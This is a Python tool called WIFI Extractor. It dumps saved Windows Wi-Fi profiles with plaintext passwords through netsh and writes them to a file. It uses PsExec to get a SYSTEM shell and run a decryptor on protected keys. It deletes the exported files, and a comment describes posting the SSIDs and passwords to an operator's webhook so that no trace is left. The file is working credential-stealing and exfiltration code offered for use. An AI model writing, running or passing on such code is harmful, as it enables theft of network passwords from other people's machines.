'''Thanks for using wifi extractor|Gracias por usar wifi extractor
    GitHub repository: https://github.com/hrdax/WIFI_Extractor
    '''
from time import sleep
import os, requests, subprocess, click, sys
import xml.etree.ElementTree as t
#lista de exportaciones xml que genera el netsh y Wifis
Archivos_XML_WIFI = []
WIFIs = []

@click.command()
@click.option('--url', '-u', default='', help='Webhook/POST URL')
@click.option('--no-txt', '-n', is_flag=True, help="No crea el archivo txt | Doesn't create the txt file")
@click.option('--version', '-v', is_flag=True, help='Imprime la version | Prints the version')
@click.option('--print-output', '-p', is_flag=True, help='Muestra la salida en la terminal | Shows the output in the terminal')
@click.option('--admin', '-a', is_flag=True, help='Indica si la consola actual tiene privilegios de admin | Indicates if the current console has admin privileges')

#funcion principal
def main(url, no_txt, version,print_output, admin):
    if version == True:
        print('\nWIFI Extractor\n\nVersion 1.3\n')
        print('\nGitHub repository: https://github.com/hrdax/WIFI_Extractor\n')
        sys.exit()
    elif url != '' and no_txt == True:
        extractor(url, no_txt,print_output, admin)
        urlweb(url)
    elif url != '' and no_txt == False:
        if url == '-n':
            no_txt = True
        extractor(url, no_txt,print_output, admin)
        urlweb(url)
    else:
        extractor(url,no_txt, print_output, admin)
        print('\n[*] Done! \n\n[*] Hecho!\n')

#hara el proceso de extraccion
def extractor(url, no_txt,print_output, admin):
    #crea el archivo txt
    if no_txt == False:
        txt = open("Extracciones.txt", "w")

    #corre el comando en la command prompt
    cmd = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

    #guarda la ruta actual
    ruta = os.getcwd()

    #recorre los archivos en la ruta
    for archivo in os.listdir(ruta):
        #encuentra los archivos xml exportados y los agrega
        if archivo.startswith("Wi-Fi-") and archivo.endswith(".xml"):
            Archivos_XML_WIFI.append(archivo)

    #contador para la lista de wifis
    conta = 0

    #recorre los archivos xml
    for archivo in Archivos_XML_WIFI:
        tr = t.parse(archivo)
        rt = tr.getroot()
        #try que verifica si el xml tiene contrasena extraible y si esque esta protegida
        try:

            ssid = rt[1][0][1].text
            contrasena = rt[4][0][1][2].text
            protected = rt[4][0][1][1].text
            os.remove(archivo)
            #guarda el ssid y la pass
            ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
            

            conta = conta + 1

            if print_output == True:
                print(f'\n{ssid_contrasena}\n')
                sleep(0.1)

            #verifica si la wifi esta protegida
            if protected == "true":
                print("[*] Detected encrypted Wifi do you want to try crack it? (You need admin privileges for this to be successful) SSID: "+ssid)
                print("[*] Detectado Wifi encriptado, quieres intentar crackearlo? (Necesitas privilegios de administrador para que esto tenga exito) SSID: "+ssid)
                
                if admin == True:
                    ans = "Y"
                    sleep(1)
                    print("Y/N:", ans)

                elif admin == False:
                    ans = input("Y/N: ")

                if ans == "Y" or ans == "y":
                    print("\n[*] Trying to get a system shell with the help of PsExec...\n")
                    print("[*] Tratando de obtener un system shell con la ayuda de PsExec...\n")
                    sleep(0.7)
                    # Intenta obtener un shell de sistema con la ayuda de PsExec y ejecuta el wdecryptor
                    try:
                        output = subprocess.run(['psexec.exe', '-accepteula', '-s', 'cmd', '/c', 'echo', '"[*]Done!|Hecho!"', '&','whoami'], capture_output=True, text=True, shell=False)
                        print(output.stdout)
                        sleep(0.8)
                        cmd = ['psexec.exe', '-nobanner','-accepteula', '-s', 'cmd', '/c', ruta + '\Wdecryptor.exe', '--key', contrasena]
                        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                        # Leer la salida del wdecryptor en tiempo real
                        for line in iter(p.stdout.readline, b''):
                            sleep(0.5)
                            print(line.decode().strip())
                        # Espera a que el proceso termine
                        p.wait()
                        print("\n[*] Done!\n[*] Hecho!\n")
                    # Si no se pudo obtener un shell de sistema, muestra un mensaje de error
                    except:
                        if os.path.isfile("psexec.exe"):
                            print("[-] Couldn't get a system shell, try running the program as administrator...\n")
                            print("[-] No se pudo obtener un system shell, intenta ejecutar el programa como administrador...\n")
                            pass
                        else:
                            print("[-] Couldn't find psexec.exe, make sure it's in the same folder as the program...\n")
                            print("[-] No se pudo encontrar psexec.exe, asegurate de que este en la misma carpeta que el programa...\n")

                        
                    
                    # Verifica si el archivo txt con la decryptacion existe
                    pdecryptedfile = r'C:\Windows\System32\decrypted.txt'
                     # Verifica si el archivo txt con la decryptacion existe
                    if os.path.isfile(pdecryptedfile):
                        # Lee el contenido del archivo
                        with open(pdecryptedfile, 'r') as file:
                            contrasena = file.read()
                            ssid_contrasena = f"[+] Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
                            
                        # Elimina el archivo de salida    
                        os.remove(pdecryptedfile)
                elif ans == "N" or ans == "n":
                    print("[*] Skipping...")
                else:
                    print("[*] Skipping...")

            
            #os.remove(archivo)        
            WIFIs.append(ssid_contrasena)


            try:
                txt.write(WIFIs[conta-1]+"\n")
            except:
                pass

        except:
            print("[-] Omitting detected WIFI without password(Open WIFI) or WIFI with WPA-Enterprise security... SSID: "+ssid+"\n[-] Omitiendo WIFI detectado sin contrasena(WIFI Libre) o con WPA-Enterprise security... SSID: "+ssid+"\n")
            os.remove(archivo)

    try: 
        #cierra el archivo txt
        txt.close()
    except:
        pass

#envia a la url de webhook si se especifica con la opcion -u
def urlweb(url):
    conta = 0
    #guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
    urlpost = url
    try:
        print('\n[+] Sending... | Enviando...\n')
        #envia los datos a la url de webhook
        for i in WIFIs:
            conta = conta + 1
            requests.post(urlpost, data=i)
            print(f'[*] Sent: {conta} of {len(WIFIs)}\n\n[*] Enviado: {conta} de {len(WIFIs)}\n')
            
        print('\n[*] Done! \n\n[*] Hecho!\n')
    except:
        print('\n[-] ***Error could not send: url not specified or invalid url | url no especificada o es invalida***\n')
        sys.exit()
        

if __name__ == '__main__':
    main()